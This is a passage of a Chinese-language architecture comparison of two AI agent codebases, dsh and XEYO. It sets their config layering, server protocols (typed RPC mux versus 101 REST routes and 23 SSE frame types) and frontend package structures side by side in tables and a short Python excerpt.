> - a `package.json` (**out-of-tree plugin dependencies** plus the profile manifest `dsh.profile` with its ordered `bundles` list)
> - a `cordis.patch.yml`

**组合顺序（逐字）**：「composed by applying each bundle's patch list in `dsh.profile.bundles` order over an empty entry list, then the profile's own patches, then any launcher patches.」

**CLI 入口（实测）**（`apps/cli/src/args.ts`）：

| 参数/子命令 | 作用 |
|---|---|
| `--profile <name>` | boot `$DSH_HOME/profiles` 下的 profile（`:131`） |
| `--patch <path>` | 在 profile 层之后叠加额外 patch-list（**repeatable**，`:132`） |
| `--dump-config` | 打印组合后的 profile 树并退出（`:133`） |
| `--dump-default-config` | 打印**不含用户层与 patch** 的树（`:134`） |
| `web` | boot web profile（`--profile web` 的别名，`:156`） |
| `plugin` | **把剩余参数转发给 profile 目录里的 pnpm**（`:171`） |

**四层结构**（第二轮结论 + 本轮实现证据）：Bundle（可安装的 patch 层）→ Profile（`dsh.profile.bundles` 有序列表 + 自己的 patch）→ Launcher patch（CLI `--patch`，repeatable）→ 用户 patch 文件 `cordis.patch.yml`（**长驻界面热重载**，`profile.ts` 注释：「The user patch layer inside a profile directory (hot-reloaded on long-lived surfaces)」）。

**`--dump-config` / `--dump-default-config` 的互斥校验**（`args.ts:90`）与「config dump 不接受 app 参数」（`:96`）都是 `program.error(...)` 硬退出。

###### 21.2 XEYO

- **配置单一来源**：`<root>/.xeyo/settings.json`；home 级与 workspace 级合并，**workspace 更具体者优先**；坏 JSON → keep-last-good + `config.invalid` 审计（方向安全）。
- **扩展点 = `enabled_extensions` 总开关 + per-item `{enabled: bool}`**（plugins / skills / mcp_servers）。
- **会话内启停** = push reconcile → T_now 活页块（`# 工具面变更` / `# 技能目录变更`），digest 幂等（同值零块），pull 兜底 = `enabled_probe`。
- **加一个扩展**：写插件目录（manifest 声明 hooks 等）→ 在 settings.json 打开 → 引擎 reconcile。**无「组合层」概念**（没有 bundle/profile/patch 链）。

###### 21.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 组合单位 | Bundle → Profile → Launcher patch → 用户 patch（**四层链式覆盖**） | settings.json 合并（home + workspace，更具体优先） |
| 组合可导出 | **有**：`--dump-config` / `--dump-default-config` 打印组合树 | 无 |
| 组合可复现 | 有（profile 目录 + package.json 依赖 + patch 链） | 部分（settings.json 快照，无依赖清单） |
| 热重载 | 用户 patch 层**热重载** | 扩展热 reconcile |
| 装插件 | `dsh plugin add <pkg>`（转发 pnpm 到 profile 目录） | 插件目录 + settings 开关 |
| 坏配置 | 未见 keep-last-good（profile 装载失败即失败） | **keep-last-good + `config.invalid` 审计**（方向安全） |
| 扩展点数量 | **层数 × 每层 patch 面**（可插入任意插件） | 固定枚举（3 类：plugins/skills/mcp_servers） |

---


## 域 25 · 服务端与协议（101 路由 + 23 帧）

> 来源：**R1 功能面·全量对比** · 原节「22. 服务端与协议」（源 L446–457）

##### 22. 服务端与协议

| | XEYO | dsh |
|---|---|---|
| 服务 | FastAPI（`python/server/app.py:292-364` 注册路由）+ SSE | Node HTTP/WS（`ctx.webServer`）；Typert RPC 网关（WebSocket mux） |
| 路由 | `server/routers/`：audit / chat / commands / control / extensions / goals / jobs / mcp / media / memory / plugins / references / rewind / sessions / skills / usage / workspace（18 个） | `packages/api/`（118 文件/38,948 行）：gateway / remotes / session-controller / settings-controller / workspace-controller |
| SSE 事件 | 25 类：`AssistantDelta`、`ReasoningDelta`、`ToolCallEvent`、`ToolProgressEvent`、`ToolResultEvent`、`FinalEvent`、`StoppedEvent`、`UsageEvent`、`ContextCompressionEvent`、`ResultEvent`、`PermissionPending/Resolved`、`AskUserPending/Resolved`、`PlanPending/Resolved`、`TaskStateEvent`、`LlmRetry/RetryStarted`（`msgtypes/events.py:7-22`） | `session/event`（durable）+ `agent/*`（live）+ `agent/assistant-stream`（process-local start/chunk/end）+ capability 事件（`fs/*`、`tools/*`、`telemetry/*`） |
| 类型化 RPC | **未见** | **Typert**：类型图生成器 + 运行时类型注册表 + 跨线 RPC（`typert/protocol/src/index.ts`、`registry/src/index.ts:17-27`）——**XEYO 没有对应物** |
| 断线恢复 | 前端直播流不自动重连；刷新后按 `cursor`（sessionStorage `turnCursor`）从 `/v1/sessions/{id}/turns/current/events?cursor=` 重放（`chatStream.ts:434-639`） | 日志即真相源，客户端按 seq 重连；`session/event` 广播 |

---


> 来源：**R2 设计面·设计级对比** · 原节「23. 服务端与协议」（源 L1049–1081）

##### 23. 服务端与协议

###### 23.1 dsh：类型化 RPC + 单一 WebSocket mux

- `packages/api/gateway/src/index.ts`：`TypertGatewayService` 把 Cordis Service 暴露为强类型 Remote 调用，在 `/api` 上拦截 RPC（`:199-204`）；所有流式 Remote 走 `REMOTE_STREAM_MUX_PATH = '/api/remote.mux'`（`stream-protocol.ts:6`）。unary 走 `invoke`/`dispatchRpc`（`:590-600`），stream 走 `stream()`（`:321`）。
- **客户端可见的事件被白名单化**：Host 只转发 **18 个 allowlisted Cordis 事件**（2 个 waterfall：`approval/request`、`user-questions/request`；16 个 emit）——`api/remotes/src/index.ts` + `remote-events.ts:16-35`。这是客户端 `ctx.remote.$on` 的**合法键集**。
- **为什么要类型化 RPC**（`typert/README.md:12` 原话）：「Client environments can call Host capabilities as typed methods … **without hand-written wire code**」。构建期类型图生成器 → 运行时注册表 → Loader 自动注册；优先用生成的定义，否则回退源码反射（`gateway/index.ts:631-642`）。

###### 23.2 XEYO：REST + SSE 事件流

- `server/app.py:296-364` 注册 **18 个 router**（workspace / media / usage / audit / control / commands / sessions / rewind / memory / chat / goals / jobs / skills / references / extensions / mcp / plugins）。
- SSE 在 `routers/chat.py`：OpenAI 兼容帧 + `xy.*` 旁路帧（`_xy_chunk`，`:517`）。
- **事件类型本轮实测**：`msgtypes/events.py` 里带 `type: str` 的 dataclass **共 20 个**；`EngineEvent` 联合列出 **19 个**（`permission_expiring` 未入联合，`:313-333`）：
  `assistant_delta / reasoning_delta / tool_call / tool_progress / tool_result / final / stopped / usage / context_compression / result / permission_pending / permission_expiring / permission_resolved / ask_user_pending / ask_user_resolved / plan_pending / plan_resolved / task_state_changed / llm_retry / llm_retry_started`

  > 第一轮写"25 类"是估的，本轮以源码为准更正为 **20 个 dataclass / 19 个联合成员**。
- **安全门禁**：`server/local_gate.py:20-32` 非 loopback 控制面一律 403（`_LOOPBACK` 含 `127.0.0.1/::1/localhost/testclient`），`XEYO_ALLOW_REMOTE_CONTROL=1` 才放开。作者对反向代理的态度（`local_gate.py:27`）：「部分反向代理会把真实 peer 放在 X-Forwarded-For；**默认仍拒**——本地桌面不该经公网代理。」CORS 也弃用 `*` 通配符（`app.py:217-237`：「通配符 + allow_credentials 等于对任意网页开放本地 API」）。
- **旁路**：`server/workspace_fs.py:39-41` 默认拒绝直写，需 `XEYO_WORKSPACE_FS_WRITABLE=1`；`write_file`/`delete_path`（`:207-212, 228-233`）绕过引擎权限与 rewind，仅打审计（`_audit_write`，`:44-62`）。

###### 23.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 协议范式 | 调用式（typed method call + mux） | 推送式（REST + SSE 事件流） |
| 类型安全 | 端到端（类型图生成 + 运行时注册表） | 无（JSON 帧约定） |
| 事件面 | **18 个白名单**（窄） | **20 类**（宽），含审批/提问/计划的 pending+resolved 配对 |
| 细粒度数据 | 走类型化 session-controller 的持久 `session/event` 流 | 全走 SSE |
| 门禁 | — | loopback 强制 + CORS 收紧 + 直写默认关 |

**两种哲学**：dsh 是"少量事件 + 强类型拉取"，XEYO 是"大量事件 + 单向推送"。前者客户端更可预测（白名单 + 生成类型），后者实现更简单但**契约靠约定**（`EngineEvent` 联合是唯一的类型约束，且已有 1 个成员漏登记）。

---


> 来源：**R3 实现面·实现级对比** · 原节「22. 服务端与协议：实现级」（源 L1917–1980）

##### 22. 服务端与协议：实现级

###### 22.1 dsh：类型化 RPC + 单一 mux

- **`packages/api`**（118 文件 / 38,948 行）——dsh 最大的包。Remote BFF 组装 + Typert RPC 网关。
- **`packages/typert`**（39 文件 / 14,988 行）——实测四个子包：`generator` / `loader` / `protocol` / `registry`，即**类型图的生成器、加载器、协议、运行时注册表**。类型图的作用是让「服务端方法与客户端调用」共享同一份类型定义，因此 `RemoteErrorDetailsMap` 可以用 `declare module` 扩展（实测 `core/session/src/types.ts:478-483` 就合并了 `'session/not-found': { sessionId: SessionId }`）——**错误详情也是类型化契约的一部分**。
- **`packages/sdk`**（20 文件 / 5,395 行）+ `packages/acp`（19 文件 / 4,885 行）+ `python/sdk` + `python/sdk-runtime`。
- **profile 五形态**（第二轮结论）：`web` / `headless` / `sdk` / `sdk-minimal` / `acp`。

**实现级要点**：dsh 的「协议」不是一组 HTTP 端点，而是**一个类型化 RPC 面 + 单一 WebSocket mux**（第二轮认定）；`session/not-found` 这类错误在类型层面被登记，客户端能静态知道有哪些失败形态。

###### 22.2 XEYO：REST 101 条路由 + SSE 双通道

**实测路由总数 101**，分布：

| 文件 | 路由数 | 文件 | 路由数 |
|---|---|---|---|
| `sessions.py` | **32** | `goals.py` / `media.py` / `memory.py` / `usage.py` | 各 3 |
| `workspace.py` | **20** | `chat.py` / `commands.py` / `extensions.py` / `mcp.py` | 各 2 |
| `control.py` | **13** | `audit.py` / `jobs.py` / `references.py` / `skills.py` | 各 1 |
| `rewind.py` | 7 | | |
| `plugins.py` | 5 | | |

**SSE 面是双通道的（本轮最重要的实现发现之一）**。序列化在 `server/routers/chat.py:1088-1125+`：

```python
async for ev in engine.submit(submit_text, options=submit_options):
    frames: list[tuple[int, bytes, str]] = []
    if isinstance(ev, AssistantDelta):
        full += ev.text
        eid = envelope_gen.next()
        frames.append((eid, _openai_chunk(ev.text, model=body.model).encode("utf-8"), "delta"))
    elif isinstance(ev, ReasoningDelta):
        if ev.text:
            xy = _id({"type": "reasoning_delta", "text": ev.text})
            frames.append((int(xy["event_id"]), _xy_chunk(xy, model=body.model).encode("utf-8"), "reasoning_delta"))
    elif isinstance(ev, ToolCallEvent):
        xy_call = {"type": "tool_call", "name": ev.name, "input": _sanitize_tool_input_for_ui(ev.input)}
        …
```

**两个关键实现事实**：

1. **`AssistantDelta` 不发成 XEYO 自己的事件类型**，而是编码成 **OpenAI 兼容的 chat completion chunk**（`_openai_chunk`），帧类别标 `"delta"`——目的是让前端能直接消费 OpenAI 形的流。实测 `assistant_delta` 这个字符串**在 `server/` 目录里零出现**。
2. **其余一切走「xy 旁路帧」**（`_xy_chunk` + `_id()` 分配 `event_id`），带自己的 `type` 名。实测 `chat.py` 里出现的 SSE type 字面量共 **23 个**：`ask_user_pending` / `ask_user_resolved` / `context_compression` / `done` / `error` / `final` / `goal` / `jobs` / `llm_retry` / `llm_retry_started` / `permission_pending` / `permission_resolved` / `plan_pending` / `plan_resolved` / `reasoning_delta` / `stopped` / `system` / `task_state_changed` / `title` / `tool_call` / `tool_progress` / `tool_result` / `usage`。

即 **19 个 EngineEvent 联合成员 → 23 个 SSE 帧类型**（因为 `title` / `jobs` / `goal` / `system` / `done` / `error` 是服务端自造的，不对应引擎事件）。

**旁路实现**：`server/workspace_fs.py`、`workspace_git.py`、`workspace_terminal.py` 三个直通服务端模块（不经引擎权限/rewind），`local_gate.py` 是 loopback 门禁，`session_pool.py` 管会话池，`turn_settlement_hub.py` 管回合结算，`synthetic_round.py` / `goal_round_driver.py` 造合成回合。

###### 22.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 协议风格 | 类型化 RPC + 单一 WebSocket mux | REST 101 路由 + SSE 流 |
| 类型安全 | **端到端类型图**（typert generator/loader/protocol/registry） | 无（手写 Pydantic 模型 + 手写前端类型） |
| 错误契约 | 类型化（`RemoteErrorDetailsMap` 可合并） | HTTP 状态码 + 错误体 |
| 流式面 | 一种（RPC 事件流） | **双通道**（OpenAI 兼容 delta + 原生 xy 旁路帧） |
| 事件类型数 | 48 个会话事件（模型可见与否有结构保证） | 23 个 SSE 帧类型（19 引擎事件 + 6 服务端自造） |
| 门禁 | 未见 loopback 门禁（本地部署） | `require_loopback` 依赖注入到每个 router |
| 旁路 | 无（seam 强制） | 3 个服务端直通模块（workspace_fs / git / terminal） |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§14 服务端协议：XEYO 101 路由逐条 + 23 帧」（源 L1170–1241）

##### §14 服务端协议：XEYO 101 路由逐条 + 23 帧

###### 14.1 XEYO 全部 HTTP 路由（101 条，按文件分组）

| 文件 | 条数 | 路由 |
|---|---|---|
| `audit.py` | 1 | GET `/v1/audit/events` |
| `chat.py` | 2 | POST `/v1/chat/completions`；POST `/api/chat` |
| `commands.py` | 2 | POST `/v1/slash`；POST `/v1/slash/parse` |
| `control.py` | 13 | GET `/v1/settings/memory`；POST `/v1/settings/memory`；POST `/v1/settings/memory/snapshot`；POST `/v1/interrupt`；POST `/api/interrupt`；POST `/v1/permission/resolve`；GET `/v1/permissions/grants`；DELETE `/v1/permissions/grants/{grant_id}`；POST `/v1/ask/resolve`；GET `/v1/settings/rewind-gc`；PUT `/v1/settings/rewind-gc`；POST `/v1/settings/rewind-gc/run`；POST `/v1/plan/{turn_id}/approve` |
| `extensions.py` | 2 | GET `/v1/extensions/settings`；POST `/v1/extensions/settings` |
| `goals.py` | 3 | GET/PATCH `/v1/sessions/{id}/goal`；POST `/v1/sessions/{id}/goal/round-driver` |
| `jobs.py` | 1 | GET `/v1/sessions/{id}/jobs` |
| `mcp.py` | 2 | GET `/v1/mcp`；POST `/v1/mcp/op` |
| `media.py` | 3 | GET `/v1/media/{digest}`；POST `/v1/media/upload`；POST `/v1/files` |
| `memory.py` | 3 | GET `/v1/memory/notes`；POST `/v1/memory/search`；POST `/v1/memory/compact` |
| `plugins.py` | 5 | GET `/v1/plugins`；POST `/v1/plugins/install`；POST `/v1/plugins/update`；POST `/v1/plugins/remove`；GET `/v1/plugins/market` |
| `references.py` | 1 | GET `/v1/references/files` |
| `rewind.py` | 7 | POST `/v1/sessions/{id}/rewind`；POST `…/rewind/{rid}/undo`；POST `…/rewind/{rid}/recover`；GET `…/rewind/{rid}`；GET `…/rewind`；GET `…/rewind/checkpoint/{mid}`；POST `…/rewind/checkpoint/{mid}/anchor` |
| `sessions.py` | **32** | POST `/v1/sessions`；POST `…/runtime-mode`；GET/POST `…/runtime-preset`；DELETE `/v1/sessions/{id}`；POST `…/delete`；GET `/v1/sessions`；GET `/v1/workspaces/sessions`；POST `…/rename`；POST `…/fork`；POST `…/archive`；POST `…/restore`；GET `…/messages`；POST `…/ui-thoughts`；GET `…/compression`；GET `…/agents`；GET `…/agents/{aid}`；POST `…/agents/{aid}/cancel`；POST `…/agents/{aid}/inbox`；DELETE `…/agents/{aid}/inbox/{iid}`；POST `…/agents/{aid}/retry`；POST `…/rollback/preview`；POST `…/rollback/execute`；POST `…/rollback/jobs/{jid}/recover`；GET `…/rollback/status/{jid}`；GET `…/task`；GET `…/turns/current/events`；POST `…/recovery/abandon`；GET `…/inbox`；DELETE `…/inbox/{qid}`；PATCH `…/inbox/{qid}`；POST `…/inbox/resume` |
| `skills.py` | 1 | GET `/v1/skills` |
| `usage.py` | 3 | GET `/v1/models`；GET `/v1/usage`；GET `/v1/usage/balance` |
| `workspace.py` | 20 | GET/POST `/v1/workspace/policy-bash`；GET/POST `/v1/workspace`；GET `/v1/workspace/entries`；GET `/v1/workspace/file`；GET `…/file/stat`；PUT `…/file`；DELETE `…/file`；GET `…/graph`；GET `…/outline`；POST `…/map/explain`；GET `…/search`；GET `…/journal`；GET `…/peers`；GET `…/git/status`；GET `…/git/log`；GET `…/git/branches`；GET `…/file/diff`；POST `…/terminal/exec` |

**结构特征**：`sessions.py` 独占 32 条（生命周期 + agents + rollback + inbox 四组）；`workspace.py` 20 条（文件读写 + git + 检索 + journal + peers）；两者合计 52 条（51%）。

###### 14.2 XEYO SSE 23 帧逐条（`server/routers/chat.py`，1575 行）

| # | 帧名 | 通道 | 产出行 | 依据 |
|---|---|---|---|---|
| 1 | `goal` | xy | 1024 | `{"type":"goal","goal":…,"driver":…}` |
| 2 | `jobs` | xy | 1043 | `{"type":"jobs","jobs":…,"wake_budget_left":…}` |
| 3 | `title` | xy | 1071 | `{"type":"title","title","pinned","enhanced"}` |
| 4 | **`assistant_delta`** | **OpenAI 兼容** | 1103 | `_openai_chunk(ev.text, model=…)` → 标准 chat chunk |
| 5 | `reasoning_delta` | xy | 1103 | `{"type":"reasoning_delta","text":…}` |
| 6 | `tool_call` | xy | 1117 | 含 `name` / `input`（经 `_sanitize_tool_input_for_ui`）/ `tool_use_id?` |
| 7 | `tool_progress` | xy | 1134 | `name` / `tool_use_id` / `message` / `elapsed_ms` |
| 8 | `tool_result` | xy | 1154 | +`todos?` / `ui?` |
| 9 | `llm_retry` | xy | 1173 | +`message?` / `provider?` / `model?` |
| 10 | `llm_retry_started` | xy | 1188 | +`attempt` / `provider?` / `model?` |
| 11 | `usage` | xy | 1260 | +`context_breakdown?` / `compact_cursor` / `last_action` / `c2_summary_chars` |
| 12 | `permission_pending` | xy | 1279 | +`path` / `expires_at` / `choices` / `peer_summary` / `intent` |
| 13 | `permission_resolved` | xy | 1294 | +`approved` / `actor` / `reason` / `resolved_at` / `choice` |
| 14 | `ask_user_pending` | xy | 1310 | +`turn_id` / `question` / `options` / `default` / `expires_at` |
| 15 | `ask_user_resolved` | xy | 1324 | +`answer` / `actor` / `timeout` / `resolved_at` |
| 16 | `plan_pending` | xy | 1338 | +`session_id` / `turn_id` / `plan` / `expires_at` |
| 17 | `plan_resolved` | xy | 1352 | +`approved` / `actor` / `reason` / `resolved_at` |
| 18 | `task_state_changed` | xy | 1365 | +`task_status` / `current_tool` / `interruptible` / `error` |
| 19 | `context_compression` | xy | 1384 | +`context_tokens?` / `context_limit?` |
| 20 | `final` | 终止帧 | 1205 | — |
| 21 | `stopped` | 终止帧 | 1222 | — |
| 22 | `error` | OpenAI 风格 | 566（`_sse_error`） | `error_body(message, err_type)`，前端 `parseOpenAiSse` 读 `obj.error` |
| 23 | `[DONE]` | 哨兵 | 1401/1406/1415 | `data: [DONE]` |

**双通道事实**：`AssistantDelta` 在 `server/` 目录里**零命中**——它被编码成 OpenAI 兼容 chunk 走出通用通道；其余 18 类全部走 `_xy_chunk(xy, model=…)` 旁路（每帧带 `event_id`）。

**关键辅助函数**：`_engine_for` / `_workspace_for` / `_busy_or_queue` / `_effective_request_modes` / `_build_enriched_resume_prompt` / `_engine_message_from_chat` / `_split_prior_and_user` / `_openai_chunk` / `_xy_chunk` / `_sanitize_tool_input_for_ui` / `_sse_error`。

###### 14.3 协议形态差异

| 维度 | dsh | XEYO |
|---|---|---|
| 形态 | **类型化 RPC**（Typert 类型图，`RemoteErrorDetailsMap` 声明错误码） | **REST + SSE** |
| 契约来源 | 类型图自动生成（`typert`） | 手写路由 + Pydantic |
| 错误类型 | `RemoteErrorDetailsMap`（如 `'session/not-found': {sessionId}`、`'llm/model-discovery-rejected'`） | `error_body(message, err_type)` |
| 事件流 vs RPC | 事件流走高吞吐 follow 帧（`SessionFollowFrame`：`snapshot` / `SessionEventEntry` / `assistant-stream`） | 单条 SSE 混装数据 + 终止 |
| 首帧形态 | `snapshot`（含 `header`/`cursor`/`records`/`hasMore`/`projections`） | xy 帧逐条推送（`event_id`） |
| 游标 | `SessionSearchCursor` / `SessionSeqCursor` | 无 |
| 客户端类型 | TS SDK + Python SDK + ACP | Typer CLI + HTTP attach + TUI |

---


## 域 26 · 前端架构

> 来源：**R1 功能面·全量对比** · 原节「21. 前端」（源 L419–445）

##### 21. 前端

| | XEYO（`gui/`） | dsh（`packages/client/` + `apps/web`） |
|---|---|---|
| 框架 | React **19.1.0** + Vite 6.3.5 | React（`platform.ts:8-13`） |
| 构建 | Vite + `tsc -b` | `tsdown`（CJS closure-factory bundle，`window.__ModuleLoader__.load`）+ lightningcss；`apps/web` 用 Vite |
| 状态 | zustand 5.0.5 + `@preact/signals-react` | `zustand/vanilla` + `immer` + `subscribeWithSelector`，**React-free 对象层**（`store/src/index.ts:14-23`） |
| 样式 | **Tailwind 4.1.7** | **CSS Modules + clsx + lightningcss**，明令禁 Tailwind/组件库（`docs/web-styling.md:15`），`--dsw-*` token |
| 组件合成 | 直接 import | **插槽系统**：`ctx.slots.register(...)`，4 种基数 `single/list/keyed/chain`，3 种作用域（`ui-slots/src/index.ts:772,90-93`）——**UI 也是插件** |
| 包数 | `gui/src` 单包（components 131 / lib 165 / stores 41 / hooks 10 …） | **50 个 client 子包**（38 个 `ui-*` + connection/file-upload/hmr/locale/modules/store/web） |
| 虚拟滚动 | `@tanstack/react-virtual`，>40 轮才窗口化（`VirtualRoundList.tsx:40`） | `@tanstack/react-virtual`（ui-trajectory）；`ui-conversation` 用 **lexical** |
| Markdown | `streamdown` + `react-syntax-highlighter` | `ui-primitives`（Markdown/shiki/katex） |
| 布局 | 固定（Sidebar + MessageList + Composer） | `ui-layout` + slots（`single|list|keyed|chain`） |
| 轨迹回看 | **未见**独立轨迹面板 | **`ui-trajectory`（40 文件/13,488 行）**：turn 感知事件账本、搜索索引、折叠、时间线区间选中、`loadOlder` 分页、来源标签（`TrajectoryView.tsx:147,210-310,380-383,500-504`） |
| HMR | Vite HMR | `client-hmr`：SSE `/plugins/events` → 热换 cordis fiber（`hmr/client/index.ts:104-140`） |
| i18n | **未见**（中文为主） | `locale` 包：命名空间字典 + `declare module` 合并，内置 `zh`/`en`（可加语言包，回退链必须终于 `en`，`locale/client/index.ts:447-455,315-334`） |
| 主题 | 存在（`stores`/主题目录） | `ui-theme`：`light|dark|system`（默认 system），boot 内联脚本防闪烁（`boot-theme.ts:12-23`） |
| 工具卡片 | 动态 verb 生成（`toolActivity.ts:13`）+ 文件变更 unified diff（`FilesChanged.tsx:3,8`） | keyed 插槽 `tool.call.toolview` + 原子视图 `bash/read/read-image/file-mutation/search/web/todo/ask-question`（`ui-tool/src/client/apply.ts:34-57`） |
| 审批/提问 | `PermissionDialog`/`AskUserDialog`/`PlanDialog` | `ui-approval`（chain 接管 composer，`ApprovalPanel.tsx:26-29`）+ `ui-user-questions`（`QuestionComposer` + `PlanReviewPanel`） |
| 设置 | `SettingsModal`（profiles/模型/权限/推理等级） | `ui-settings` + `ui-settings-general/models/plugins/plugin-inventory`；**每个 section 由注册它的 Host 插件拥有** |
| 桌面壳 | **Tauri 2（Rust 1,162 行）**：后端进程守护（10s 探活/30s 重启）、`python_exe_usable` 探测、`BACKEND_SPAWN_ERROR` 静态槽、透明无边框窗、桌宠独立窗（`pet.rs`） | **无桌面壳**（宿主只是 Node 进程 + 本地 HTTP） |

**XEYO 独有**：Tauri 原生壳、桌宠、桌面岛（pasture）、WebView2 数据隔离方案、`XeyoUI` 工具、Screenshot、Screenshot 驱动的 GUI 验证链路。
**dsh 独有**：插槽化插件 UI、Trajectory 面板、i18n 双语、HMR 热换、浏览器快照 e2e。

---


> 来源：**R2 设计面·设计级对比** · 原节「24. 前端架构」（源 L1082–1113）

##### 24. 前端架构

###### 24.1 dsh：React-free 对象层 + 插槽化 UI

- **状态**（`client/store/src/index.ts:1-9`）：快照 store 引擎 = **zustand/vanilla + immer + subscribeWithSelector + rafFlush**，明确写「**NO selector hook**」；React 绑定由 `ui-renderer` 合成（`:7-8`）。flush 分 `sync` / `raf`（`:103-104`）。
- **插槽系统**（`client/ui-slots/src/index.ts:89-93`）：4 种基数 `single | list | keyed | chain` × 3 种作用域 `root | session-maybe | session`——**UI 也是插件**。
- **包数**：`packages/client/` 下 50 个子包（38 个 `ui-*` + connection / file-upload / hmr / locale / modules / store / web）。
- **事件来源**：18 个转发事件 + `session/event` 持久流 + `agent/*` 直播。
- **Trajectory 面板**：独立 `ui-trajectory` 包（40 文件 / 13,488 行），turn 感知事件账本 + 搜索索引 + 折叠 + 时间线区间选中 + `loadOlder` 分页 + 来源标签。
- **HMR**：`client-hmr`：SSE `/plugins/events` → 热换 cordis fiber（`hmr/client/index.ts:104-140`）。

###### 24.2 XEYO：业务驱动的单包 React 应用

- `gui/src`：React 19 + Vite；zustand 5 + `@preact/signals-react`。
- **IndexedDB**（`lib/db.ts:42`）：库 `xeyo-web`（由旧 `xenyon-web` 迁移，`:41-43`），对象仓库 `spaces / sessions / messages / kv`（`:17-37`）。
- **流式**：`lib/sessionStreams.ts:18-19` 用 `SessionStreamState.lastEventId` 作 reattach cursor，断线后按 cursor 重放（**非自动重连**，`:13-17`）。
- **关键 UI**：`Composer.tsx`、`FilesChanged.tsx`（unified diff）、`toolActivity.ts`（动态 verb）、`AskUserDialog` / `PermissionDialog` / `PlanDialog`、`VirtualRoundList.tsx`（>40 轮才窗口化，`:40`）。

###### 24.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 组件合成 | 插槽（4 基数 × 3 作用域），UI 插件化 | 直接 import |
| 包数 | 50 个 client 子包 | `gui/src` 单包（components 131 / lib 165 / stores 41 / hooks 10） |
| 状态层 | React-free 对象层 + 渲染绑定分离 | zustand + signals，React 耦合 |
| 轨迹回看 | **Trajectory 面板**（13.5k 行） | **未见** |
| 国际化 | `locale` 包（zh/en，回退链终于 en） | **未见**（中文为主） |
| 热更新 | cordis fiber HMR | Vite HMR |
| 断线恢复 | 日志 seq 重连 | cursor 重放 current turn events |

---


> 来源：**R3 实现面·实现级对比** · 原节「23. 前端架构：实现级」（源 L1981–2016）

##### 23. 前端架构：实现级

###### 23.1 dsh：50 个插槽化包

`packages/client/` 下实测 **47 个以上子包**（第一轮数到 47，加 `web` 等）——从 `ui-chat` / `ui-conversation` / `ui-trajectory` 到 `ui-settings-plugin-inventory` / `ui-directory-picker-native`。设计要点（第二轮）：**React-free 对象层 + 插槽化 UI 注册**（`ui-slots`）。

**Trajectory 的实现**（`packages/client/ui-trajectory/src/client/trajectory-record.ts`）：数据来自 session log 投影（`session-projection`），因此**天然可回放到任意历史点**——这正是 `presentCall`/`presentResult` 必须是纯函数的原因（§7.1）。

**其他实测前端相关包**：`ui-conversation/src/client/contract/records.ts`（会话记录契约）、`ui-settings-plugins/src/client/agent-loop-card-controller.ts`（**agent-loop 的 UI 卡片控制器**——说明 dsh 把 loop 配置也做成可插拔 UI）。

###### 23.2 XEYO：单包 React 应用

`gui/src/` 实测 15 个一级子目录：`assets` / `bench` / `components` / `generated` / `hooks` / `lib` / `pages` / `pasture` / `paths` / `pet` / `stores` / `styles` / `test` / `theme` + 入口 `App.tsx` / `main.tsx`。

值得点名的三个**业务独有**目录：
- `pet/`（桌宠）——dsh 完全没有的产品形态；
- `pasture/`（牧场？UI 概念）；
- `bench/`（评测面板）——**把评测口径做进了产品 UI**。

`generated/` 是**生成物目录**（斜杠命令 manifest 的落点，`*/generated/slashManifest.ts`，由 `py -3.11 -m slash.export_manifest` 重导）。

###### 23.3 对照

| 维度 | dsh | XEYO |
|---|---|---|
| 包结构 | 50 个独立包（可插槽注册） | 单包，15 个一级目录 |
| UI 注册 | slots 机制（插件式） | 无（静态导入） |
| 事件消费 | 全部 48 类事件有类型化契约 | 消费 SSE 23 类帧中的一部分（TUI 只处理 17 类，第二轮已认定） |
| 轨迹回看 | **Trajectory 面板**（数据来自 session log 投影，可回放） | 有历史面板（IndexedDB + 后端 transcript） |
| 呈现契约 | `presentCall`/`presentResult` 纯函数，日志回放可复原 | 前端按工具名特判渲染 |
| 生成物 | cordis catalog / tool catalog（生成 + 校验） | slash manifest（生成） |
| 桌宠 / 评测面板 | 无 | **有**（`pet/`、`bench/`） |
| 状态存储 | store 包 + connection 层 | IndexedDB（origin 隔离）+ zustand |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§15 前端与桌面壳：逐模块」（源 L1242–1295）

##### §15 前端与桌面壳：逐模块

###### 15.1 XEYO `gui/src`（391 文件 / 81,484 行）

| 目录 | 文件数 | 职责 |
|---|---|---|
| `components/` | **131** | React 组件（含 Composer / 消息列表 / 工具卡片 / 审批 / 侧栏 / 设置） |
| `lib/` | **165** | 协议层、工具、工具函数（最大模块） |
| `stores/` | **41** | 状态（zustand 类） |
| `pet/` | 15 | 桌宠 |
| `pasture/` | 12 | （待查） |
| `hooks/` | 10 | 自定义 hooks |
| `bench/` | 8 | 基准页 |
| `theme/` | 2 | 主题 |
| `generated/` | 1 | 生成物（斜杠 manifest） |
| `App.tsx` / `main.tsx` / `paths/` / `test/` | 各 1 | 入口与测试 |

**SSE 消费**：`lib` 中 `case '<name>':` 分支为前端消费口径（前轮实测）。
**IndexedDB**：`session.spaceId → rootPath` 映射，按 origin 隔离；权威 transcript 在后端 JSONL。

###### 15.2 XEYO Rust 壳（3 文件 / 1,162 行）

| 文件 | 行数 | 职责 |
|---|---|---|
| `lib.rs` | ~1,000（31,110 字节） | 后端进程拉起 + 窗口/托盘/快捷键 + commands（`resolve_python_exe` / `python_exe_usable` / `BACKEND_SPAWN_ERROR` / `get_backend_error`） |
| `main.rs` | 104 字节 | 入口 |
| `pet.rs` | 4,832 字节 | 桌宠窗口 |

###### 15.3 dsh 前端

| 项 | 内容 |
|---|---|
| 包数 | `packages/client/` 下 **45 个子包目录**（`ls packages/client` 返回 50 条目 = 45 目录 + 5 文件：`AGENTS.md`/`README.md`/`README.zh.md`/`README.i18n.yaml`/`tsdown.client.ts`） |
| 组装机制 | **slots**（`ui-slots`）——插件式 UI 注册 |
| store / connection | 独立子包（`store` / `connection`） |
| Trajectory | `ui-trajectory` 面板（按来源检查、搜索、分叉、重放） |
| 桌面壳 | ❌ **无**（apps 下只有 `cli` 与 `web`） |
| CLI | `apps/cli/`（profile 解析：web/headless/sdk/sdk-minimal/acp） |
| Web | `apps/web/` + 浏览器快照测试（`snapshots/web/`、`apps/web/tests/expected/`） |

###### 15.4 差异

| 维度 | dsh | XEYO |
|---|---|---|
